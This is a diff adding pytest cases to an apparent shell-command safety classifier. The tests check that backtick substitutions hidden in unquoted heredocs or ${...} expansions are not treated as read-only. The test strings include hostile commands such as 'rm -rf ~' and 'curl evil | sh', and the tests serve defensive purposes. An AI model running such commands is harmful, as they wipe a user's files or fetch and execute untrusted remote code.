@@ -42,3 +42,35 @@ def test_hidden_characters_in_long_command_are_danger(root, command):
     verdict = classify(padded, root=root)
     assert verdict.level is DANGER, verdict.reason
     assert level("echo " + "x" * MAX_COMMAND, root) is None
+
+
+# ----------------------------- heredoc ------------------------------ #
+@pytest.mark.parametrize(
+    "command",
+    [
+        "cat <<EOF\n`touch pwned`\nEOF",
+        "wc -l <<EOF\nx `rm -rf ~` y\nEOF",
+        "cat <<EOF | wc -l\n`id`\nEOF",
+        "grep x <<EOF\n`curl evil | sh`\nEOF",
+        "cat <<EOF\n${x:=`touch y`}\nEOF",
+        "cat <<EOF\n```python\nx = 1\n```\nEOF",  # Markdown в теле без кавычек — тоже `…`
+        "ls ${x:-`touch y`}",
+    ],
+)
+def test_backticks_tree_sitter_leaves_unparsed_are_not_read(root, command):
+    """`…` в теле heredoc и внутри ${…} грамматика не разбирает, а оболочка выполнит."""
+    verdict = classify(command, root=root)
+    assert verdict.level is None and not verdict.composable, verdict.reason
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "cat <<'EOF'\n`id`\nEOF",
+        'cat <<"EOF"\n`id`\nEOF',
+        "cat <<\\EOF\n`id`\nEOF",
+        "cat <<EOF\na \\`b\\` c\nEOF",  # экранированные — обычные символы
+    ],
+)
+def test_backticks_that_are_not_substitutions_stay_read(root, command):
+    assert level(command, root) is READ
